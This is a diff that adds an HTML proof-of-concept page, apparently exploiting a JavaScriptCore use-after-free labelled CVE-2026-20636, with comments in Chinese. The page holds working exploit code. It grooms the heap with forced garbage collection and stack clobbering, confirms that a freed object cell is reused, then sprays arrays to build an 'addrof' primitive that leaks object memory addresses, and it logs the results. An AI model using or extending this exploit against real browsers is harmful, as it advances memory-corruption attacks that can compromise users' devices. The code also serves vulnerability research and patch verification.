@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2026-20636 addrof</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 10px; font-size: 11px; }
+#log { white-space: pre-wrap; word-break: break-all; }
+.ok { color: #0f0; } .err { color: #f44; } .info { color: #aaa; } .hit { color: #ff0; font-weight: bold; }
+button { font-size: 16px; padding: 10px 20px; margin: 4px; background: #222; color: #0f0; border: 1px solid #0f0; }
+</style>
+</head>
+<body>
+<h3 style="color:#0ff">CVE-2026-20636 PoC</h3>
+<button onclick="testCellReuse()">1️⃣ Cell Reuse Test</button>
+<button onclick="testButterfly()">2️⃣ Butterfly addrof</button>
+<button onclick="document.getElementById('log').textContent=''">Clear</button>
+<pre id="log"></pre>
+
+<script>
+const logEl = document.getElementById('log');
+function log(msg, cls) {
+    const s = document.createElement('span');
+    s.className = cls || '';
+    s.textContent = msg + '\n';
+    logEl.appendChild(s);
+    window.scrollTo(0, document.body.scrollHeight);
+}
+
+const convBuf = new ArrayBuffer(8);
+const f64 = new Float64Array(convBuf);
+const u32 = new Uint32Array(convBuf);
+function f2i(f) { f64[0] = f; return BigInt(u32[0]) | (BigInt(u32[1]) << 32n); }
+function i2f(i) { u32[0] = Number(i & 0xFFFFFFFFn); u32[1] = Number((i >> 32n) & 0xFFFFFFFFn); return f64[0]; }
+function hex(v) { return "0x" + (typeof v === "bigint" ? v.toString(16).padStart(16, "0") : v.toString(16)); }
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// GC — 激进混合
+function gcFull() {
+    let x;
+    for (let i = 0; i < 1000; i++) x = new ArrayBuffer(1024 * 1024);
+    let arr = [];
+    for (let i = 0; i < 100000; i++) arr.push({a: i});
+    arr = null; x = null;
+}
+function gcEden() {
+    let x;
+    for (let i = 0; i < 100; i++) x = new ArrayBuffer(1024 * 1024);
+    let arr = [];
+    for (let i = 0; i < 50000; i++) arr.push({a: i});
+    arr = null; x = null;
+}
+
+// 栈清洗 — 完全匹配 JSC shell 的 deepClobber(300)
+function deepClobber(n) {
+    let a0=0,a1=0,a2=0,a3=0,a4=0,a5=0,a6=0,a7=0;
+    let b0=0,b1=0,b2=0,b3=0,b4=0,b5=0,b6=0,b7=0;
+    let c0=0,c1=0,c2=0,c3=0,c4=0,c5=0,c6=0,c7=0;
+    let d0=0,d1=0,d2=0,d3=0,d4=0,d5=0,d6=0,d7=0;
+    if (n > 0) return deepClobber(n - 1);
+    return a0+b0+c0+d0;
+}
+
+// ============================================================
+// 共用 UAF 基础设施
+// ============================================================
+function setupUAF() {
+    const holder = { key: 1 };
+    let warmMap = new Map();
+    warmMap.set({0: 1.1}, 1);
+
+    function inlinee(value, key) {
+        holder.key = key;
+    }
+
+    // DFG warmup — 3000 次确保 DFG 编译
+    for (let i = 0; i < 3000; i++) {
+        warmMap.forEach(inlinee);
+    }
+
+    function storeKey(marker) {
+        let m = new Map([[{0: marker}, 1]]);
+        m.forEach(inlinee);
+    }
+
+    return { holder, storeKey };
+}
+
+// ============================================================
+// TEST 1: Cell Reuse — 验证 UAF 是否触发
+// 同 diag_clean.js TEST4: spray 同 shape JSFinalObject
+// ============================================================
+async function testCellReuse() {
+    logEl.textContent = '';
+    log("=== TEST 1: Cell Reuse (UAF 诊断) ===", "hit");
+    log("[*] UA: " + navigator.userAgent.substring(0, 70), "info");
+    log("");
+
+    try {
+        log("[*] Setting up UAF...", "info");
+        let { holder, storeKey } = setupUAF();
+
+        // promote to old-gen
+        gcFull(); await sleep(200);
+        gcFull(); await sleep(200);
+        gcFull(); await sleep(300);
+        log("[+] holder promoted to old-gen", "ok");
+
+        // heap prime
+        for (let i = 0; i < 200000; i++) ({0: i * 1.1});
+        gcEden(); await sleep(100);
+        log("[+] heap primed", "ok");
+
+        // Multi-round: 同 diag_clean.js TEST4
+        log("[*] Starting UAF loop...", "info");
+
+        for (let r = 0; r < 200; r++) {
+            storeKey(100.1 + r);   // victim = {0: double}
+            deepClobber(300);      // 完全匹配 JSC shell
+            deepClobber(300);      // 两次确保
+
+            // eden GC
+            gcEden();
+            await sleep(50);
+
+            // spray 同 shape: {0: 2.2}
+            let sp = [];
+            for (let j = 0; j < 2000; j++) sp.push({0: 2.2});
+
+            let t = typeof holder.key;
+            if (t === "object") {
+                let val = holder.key[0];
+                if (val === 2.2) {
+                    log("[+] CELL REUSE at round " + r + "!", "hit");
+                    log("[+] holder.key[0] = 2.2 (was " + (100.1+r).toFixed(1) + ")", "ok");
+                    log("[+] UAF CONFIRMED ON THIS DEVICE!", "hit");
+                    return;
+                }
+            } else {
+                log("[+] TYPE CHANGED at round " + r + ": " + t, "hit");
+                log("[+] UAF CONFIRMED (cell reused by different type)!", "ok");
+                return;
+            }
+
+            if (r % 10 === 0) {
+                let v = "?";
+                try { v = holder.key[0]; } catch(e) {}
+                log("[*] round " + r + " — key[0]=" + v + " type=" + typeof holder.key, "info");
+            }
+        }
+
+        log("[-] NO UAF in 200 rounds", "err");
+        log("[*] DIAGNOSIS: DFG 可能没编译 forEach/inlinee，或栈清洗不够", "err");
+        try {
+            log("[*] final key[0] = " + holder.key[0], "info");
+            log("[*] typeof = " + typeof holder.key, "info");
+        } catch(e) {}
+
+    } catch(e) {
+        log("[-] EXCEPTION: " + e.message, "err");
+        log(e.stack || "", "info");
+    }
+}
+
+// ============================================================
+// TEST 2: Butterfly Reuse → addrof
+// 只在 TEST 1 成功后运行
+// ============================================================
+async function testButterfly() {
+    logEl.textContent = '';
+    log("=== TEST 2: Butterfly Reuse → addrof ===", "hit");
+    log("[*] UA: " + navigator.userAgent.substring(0, 70), "info");
+    log("");
+
+    try {
+        log("[*] Setting up UAF...", "info");
+        let { holder, storeKey } = setupUAF();
+
+        gcFull(); await sleep(200);
+        gcFull(); await sleep(200);
+        gcFull(); await sleep(300);
+        log("[+] holder in old-gen", "ok");
+
+        for (let i = 0; i < 200000; i++) ({0: i * 1.1});
+        gcEden(); await sleep(100);
+        log("[+] heap primed", "ok");
+
+        let targetObj = { _m: 0xCAFE };
+        let hitSpray = null, hitRound = -1;
+
+        log("[*] Butterfly spray loop...", "info");
+        for (let r = 0; r < 200; r++) {
+            storeKey(100.1 + r);
+            deepClobber(300);
+            deepClobber(300);
+            gcEden();
+            await sleep(50);
+
+            // JSArray spray — cell→IsoSubspace, butterfly→Gigacage
+            let sp = [];
+            for (let j = 0; j < 3000; j++) sp.push([targetObj]);
+
+            let val;
+            try { val = holder.key[0]; } catch(e) { continue; }
+
+            if (typeof val === "number") {
+                if (Math.abs(val - (100.1 + r)) > 0.01) {
+                    log("[+] BUTTERFLY REUSE round " + r + "!", "hit");
+                    log("[*] bits: " + hex(f2i(val)), "info");
+                    hitSpray = sp; hitRound = r;
+                    break;
+                }
+            } else if (typeof val !== "object") {
+                log("[!] type=" + typeof val + " round " + r, "err");
+                hitRound = r; break;
+            }
+            if (r % 20 === 0) log("[*] round " + r, "info");
+        }
+
+        if (hitRound < 0 || !hitSpray) {
+            log("[-] No butterfly reuse", "err"); return;
+        }
+
+        // match
+        let rawBits = f2i(holder.key[0]);
+        let matchIdx = -1;
+        for (let i = 0; i < hitSpray.length; i++) {
+            let saved = hitSpray[i][0];
+            hitSpray[i][0] = {u:1};
+            if (f2i(holder.key[0]) !== rawBits) { matchIdx = i; hitSpray[i][0] = saved; break; }
+            hitSpray[i][0] = saved;
+        }
+        if (matchIdx < 0) { log("[-] match failed", "err"); return; }
+        log("[+] match: spray[" + matchIdx + "]", "ok");
+
+        // addrof
+        function addrof(obj) {
+            hitSpray[matchIdx][0] = obj;
+            return f2i(holder.key[0]);
+        }
+
+        let o1 = {t:1}, o2 = {t:2};
+        let a1 = addrof(o1), a2 = addrof(o2);
+        log("[+] addrof(o1) = " + hex(a1), "ok");
+        log("[+] addrof(o2) = " + hex(a2), "ok");
+        let a1b = addrof(o1);
+
+        log("\n====== RESULT ======", "hit");
+        log("distinct: " + (a1 !== a2 ? "✓" : "✗"), a1 !== a2 ? "ok" : "err");
+        log("consistent: " + (a1b === a1 ? "✓" : "✗"), a1b === a1 ? "ok" : "err");
+        log("tag: " + hex((a1 >> 48n) & 0xFFFFn), "info");
+        let ok = a1 !== 0n && a2 !== 0n && a1 !== a2 && a1b === a1;
+        log("addrof: " + (ok ? "SUCCESS ✓" : "FAIL"), ok ? "hit" : "err");
+        log("====================", "hit");
+
+    } catch(e) {
+        log("[-] EXCEPTION: " + e.message, "err");
+        log(e.stack || "", "info");
+    }
+}
+</script>
+</body>
+</html>
